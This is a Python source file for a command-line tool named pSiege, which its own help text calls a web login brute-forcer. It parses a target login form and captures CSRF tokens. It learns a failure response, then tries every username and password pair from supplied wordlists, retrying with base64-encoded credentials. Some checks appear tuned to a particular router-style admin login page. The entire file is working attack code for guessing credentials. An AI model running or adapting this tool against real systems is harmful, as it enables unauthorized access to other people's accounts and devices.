import requests
from bs4 import BeautifulSoup
import re
import sys
from urllib.parse import urljoin, urlencode
import argparse
import base64

class PSiege:
    def __init__(self, url, verbose=False):
        self.url = url
        self.verbose = verbose
        self.success_indicators = ["dashboard", "logout", "welcome", "profile", "account", "settings"]
        self.initialize_session()

    def initialize_session(self):
        self.session = requests.Session()
        self.form_data = {}
        self.method = 'GET'
        self.action = ''
        self.csrf_token = None
        self.data_type = 'form-data'
        self.failure_indicator = None

    def fetch_page(self):
        try:
            if self.verbose:
                print("Fetching the page...")
            response = self.session.get(self.url)
            response.raise_for_status()  # Raise HTTPError for bad responses

            # Check for JavaScript redirect
            if 'window.top.location.href' in response.text:
                redirect_url = re.search(r"window\.top\.location\.href='([^']+)'", response.text)
                if redirect_url:
                    redirect_url = redirect_url.group(1)
                    if not redirect_url.startswith('http'):
                        redirect_url = urljoin(response.url, redirect_url)
                    if self.verbose:
                        print(f"Redirecting to {redirect_url}")
                    response = self.session.get(redirect_url)
                    response.raise_for_status()

            if self.verbose:
                print("Fetched HTML Content:")
                print(response.text[:1000])  # Print the first 1000 characters for debugging
            self.soup = BeautifulSoup(response.content, 'lxml')
            return True
        except requests.exceptions.RequestException as e:
            print(f"Failed to fetch page. Error: {e}")
            return False

    def analyze_form(self):
        form = self.soup.find('form')
        if not form:
            print("No form found on the page.")
            return False

        self.method = form.get('method', 'GET').upper()
        action = form.get('action', '')
        self.action = urljoin(self.url, action)  # Ensure action is an absolute URL
        inputs = form.find_all('input')
        
        for input_tag in inputs:
            name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            value = input_tag.get('value', '')
            self.form_data[name] = value
            
            if input_type == 'hidden' and 'csrf' in name.lower():
                self.csrf_token = value

        return True

    def determine_data_type(self):
        try:
            response = self.session.head(self.url)
            response.raise_for_status()
            content_type = response.headers.get('Content-Type', '').lower()
            if 'json' in content_type:
                self.data_type = 'json'
            elif 'form' in content_type:
                self.data_type = 'form-data'
        except requests.exceptions.RequestException as e:
            print(f"Failed to determine data type. Error: {e}")

    def submit_form(self, username, password, encode_base64=False):
        # Encode username and password if required
        if encode_base64:
            self.form_data['username'] = base64.b64encode(username.encode()).decode()
            self.form_data['password'] = base64.b64encode(password.encode()).decode()
        else:
            self.form_data['username'] = username
            self.form_data['password'] = password

        # Prepare login_authorization in base64 if needed
        auth_value = base64.b64encode(f"{username}:{password}".encode()).decode()
        self.form_data['login_authorization'] = auth_value
        self.form_data['next_page'] = 'GameDashboard.asp'  # Based on the Burp data

        try:
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36',
                'Referer': self.url
            }
            if self.verbose:
                print("Submitting form with the following data:")
                for key, value in self.form_data.items():
                    print(f"{key}: {value}")

            if self.method == 'POST':
                response = self.session.post(self.action, data=urlencode(self.form_data), headers=headers, allow_redirects=False)
            else:
                response = self.session.get(self.action, params=self.form_data, headers=headers, allow_redirects=False)
            
            if self.verbose:
                print("Received response:")
                print(response.text[:1000])  # Print the first 1000 characters for debugging

            if response.status_code in [301, 302]:
                if self.verbose:
                    print(f"Redirected to {response.headers['Location']}")
                redirect_url = response.headers['Location']
                if not redirect_url.startswith('http'):
                    redirect_url = urljoin(self.url, redirect_url)
                response = self.session.get(redirect_url)
                if self.verbose:
                    print("Followed redirect response:")
                    print(response.text[:1000])  # Print the first 1000 characters for debugging

            return response
        except requests.exceptions.RequestException as e:
            print(f"Failed to submit form. Error: {e}")
            return None

    def probe_failure_indicator(self):
        if self.verbose:
            print("Probing for failure indicators with known bad credentials...")
        response = self.submit_form("invalid_user", "invalid_pass")
        if response:
            self.failure_indicator = response.text
            if self.verbose:
                print("Captured failure indicator.")
                print(f"Failure indicator content: {self.failure_indicator[:1000]}")  # Print first 1000 chars for debugging
        else:
            print("Failed to capture failure indicator.")

    def analyze_response(self, response):
        if not response:
            return False
        
        # Stage 1: Check HTTP status code
        if response.status_code != 200:
            if self.verbose:
                print(f"Unexpected HTTP status code: {response.status_code}")
            return False
        
        # Stage 2: Check for redirect to the login page as failure
        if "parent.location.href='/Main_Login.asp'" in response.text or "location.href='/Main_Login.asp'" in response.text:
            if self.verbose:
                print("Detected redirection to login page, indicating failure.")
            return False
        
        # Stage 3: Check for success indicators
        for indicator in self.success_indicators:
            if indicator in response.text.lower():
                if self.verbose:
                    print(f"Detected success indicator: {indicator}")
                return True
        
        # Stage 4: Compare with failure indicator
        if self.failure_indicator and self.failure_indicator in response.text:
            if self.verbose:
                print("Detected failure indicator.")
            return False
        
        if self.verbose:
            print("Response does not indicate incorrect login directly. Analyze manually.")
        return False

    def brute_force(self, usernames, passwords, encode_base64=False):
        for username in usernames:
            for password in passwords:
                if self.verbose:
                    print(f"Trying {username}:{password}")
                response = self.submit_form(username, password, encode_base64)
                if response and self.analyze_response(response):
                    print(f"Success with {username}:{password}")
                    return True
        return False

    def run_auto(self, usernames, passwords):
        if self.fetch_page() and self.analyze_form():
            self.determine_data_type()
            self.probe_failure_indicator()
            # Try without base64 encoding
            success = self.brute_force(usernames, passwords)
            if not success:
                if self.verbose:
                    print("Retrying with base64 encoded credentials...")
                # Try with base64 encoding
                self.brute_force(usernames, passwords, encode_base64=True)
        self.initialize_session()  # Reset session after each run

def main():
    parser = argparse.ArgumentParser(description='pSiege: Web login brute-forcer.')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-aa', action='store_true', help='Automatically analyze and brute-force using provided credentials')
    parser.add_argument('-u', help='Single username')
    parser.add_argument('-p', help='Single password')
    parser.add_argument('-U', help='Path to usernames list')
    parser.add_argument('-P', help='Path to passwords list')
    parser.add_argument('-vv', action='store_true', help='Enable verbose output')

    args = parser.parse_args()
    psiege = PSiege(args.url, args.vv)

    usernames = []
    passwords = []

    if args.u:
        usernames.append(args.u)
    if args.p:
        passwords.append(args.p)
    if args.U:
        try:
            with open(args.U) as uf:
                usernames.extend([line.strip() for line in uf])
        except FileNotFoundError as e:
            print(f"File not found: {e}")
            return
    if args.P:
        try:
            with open(args.P) as pf:
                passwords.extend([line.strip() for line in pf])
        except FileNotFoundError as e:
            print(f"File not found: {e}")
            return

    if not usernames or not passwords:
        print("You must provide at least one username and one password using -u, -p, -U, or -P.")
        return

    if args.aa:
        psiege.run_auto(usernames, passwords)
    else:
        psiege.brute_force(usernames, passwords)

if __name__ == "__main__":
    main()
